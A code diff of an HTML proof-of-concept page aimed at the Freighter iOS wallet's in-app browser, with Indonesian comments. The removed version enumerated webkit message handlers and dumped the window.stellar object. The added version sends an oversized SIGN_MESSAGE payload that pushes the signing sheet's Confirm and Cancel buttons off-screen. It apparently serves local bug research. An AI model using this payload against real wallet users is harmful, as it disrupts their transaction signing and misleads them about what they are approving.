@@ -1,50 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Freighter iOS - Final Handler Test [BW]</title>
-<style>
-body{background:#fff;color:#000;font-family:monospace;padding:14px;font-size:11px}
-h2{font-size:12px;border-bottom:2px solid #000;padding-bottom:6px}
-pre{background:#f5f5f5;border:1px solid #000;padding:10px;white-space:pre-wrap;word-break:break-all;min-height:400px}
-button{background:#000;color:#fff;border:2px solid #000;padding:12px;width:100%;font-weight:bold;margin-top:6px}
-</style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Freighter DoS PoC - Local Test</title>
 </head>
-<body>
-<h2>Freighter iOS - Final Handler Brute Force [BW]</h2>
-<pre id=log>Ready. Origin: </pre>
-<button onclick="scan()">SCAN</button>
-<button onclick="brute()">BRUTE FORCE hidden handlers</button>
-<button onclick="dumpStellar()">DUMP window.stellar value</button>
+<body style="font-family:sans-serif;padding:20px">
+<h3>Freighter iOS - DoS PoC (Local Only)</h3>
+<p>Payload ini dari issue #708 / signMessage bottom sheet.</p>
+<button id="btn" style="width:100%;padding:20px;font-size:18px;background:black;color:white;border-radius:12px">
+  TRIGGER LONG MESSAGE
+</button>
+<pre id="log" style="background:#eee;padding:10px;margin-top:20px;white-space:pre-wrap"></pre>
+
 <script>
-let logEl=document.getElementById('log');
-logEl.textContent+=location.origin+'\nUA:'+navigator.userAgent.substring(0,120)+'\n';
-function log(t){logEl.textContent+='\n'+t;}
-function scan(){
- log('\n--- SCAN ---');
- log('window.stellar:'+!!window.stellar+' val:'+JSON.stringify(window.stellar).substring(0,500));
- if(window.stellar){log('provider = '+window.stellar.provider+' typeof:'+typeof window.stellar.provider);}
-}
-function brute(){
- log('\n--- BRUTE FORCE ---');
- let names=['freighter','Freighter','stellar','Stellar','FreighterStellar','sign','signTransaction'];
- let mh=window.webkit&&window.webkit.messageHandlers;
- if(!mh){log('messageHandlers not found');return;}
- names.forEach(n=>{
-  try{let h=mh[n]; log(n+': exists='+(!!h)+' postMessage='+(h&&!!h.postMessage));}
-  catch(e){log(n+': error '+e);}
- });
-}
-function dumpStellar(){
- log('\n--- DUMP ---');
- try{
-  let s=window.stellar;
-  log('JSON: '+JSON.stringify(s));
-  log('provider raw: '+String(s.provider));
-  if(String(s.provider).length===9) log('length 9 = "freighter" confirmed');
- }catch(e){log('err:'+e);}
-}
-scan();
+const log = t => document.getElementById('log').innerText += t+"\n";
+
+log("window.stellar: " + JSON.stringify(window.stellar || "not found - bukan di Discovery tab"));
+
+document.getElementById('btn').onclick = () => {
+  // Payload yang bikin bottom sheet off-screen di v1.20.27 iOS
+  // 13 field x 64 char hex = ~ 900 char JSON
+  const payload = {
+    type: "CANONICAL_JSON_BOMB",
+    p1: "a".repeat(64),
+    p2: "b".repeat(64),
+    p3: "c".repeat(64),
+    p4: "d".repeat(64),
+    p5: "e".repeat(64),
+    p6: "f".repeat(64),
+    p7: "g".repeat(64),
+    p8: "h".repeat(64),
+    p9: "i".repeat(64),
+    p10: "j".repeat(64),
+    p11: "k".repeat(64),
+    p12: "l".repeat(64),
+    p13: "m".repeat(64)
+  };
+  const msg = JSON.stringify(payload);
+  log("Sending length: " + msg.length);
+
+  // Cara Freighter Mobile terima dari Discovery WebView
+  try {
+    window.ReactNativeWebView.postMessage(JSON.stringify({
+      type: "SIGN_MESSAGE",
+      id: Date.now(),
+      payload: { message: msg }
+    }));
+    log("postMessage sent. Cek apakah bottom sheet muncul tapi tombol Confirm/Cancel hilang?");
+  } catch(e) {
+    log("Error: " + e);
+  }
+};
 </script>
 </body>
 </html>
